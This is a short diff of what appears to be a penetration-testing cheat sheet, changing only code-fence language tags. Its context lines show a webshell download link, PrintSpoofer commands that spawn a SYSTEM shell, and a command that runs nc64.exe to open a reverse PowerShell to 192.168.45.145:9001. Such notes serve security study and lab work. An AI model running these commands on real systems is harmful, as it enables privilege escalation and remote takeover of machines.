@@ -63,7 +63,7 @@ https://raw.githubusercontent.com/voidexec/sec/main/webshells/shell.php
 
 PrintSpoofer
 
-```powershell
+```
 https://github.com/itm4n/PrintSpoofer/releases
 # Usage 1 - Spawning cmd interactive as system
 PrintSpoofer64.exe -i -c cmd
@@ -73,7 +73,7 @@ PrintSpoofer64.exe -c "C:\Users\Public\nc64.exe 192.168.45.145 9001 -e powershel
 
 NC
 
-```powershell
+```
 https://github.com/int0x33/nc.exe/
 # nc64.exe
 https://raw.githubusercontent.com/int0x33/nc.exe/master/nc64.exe
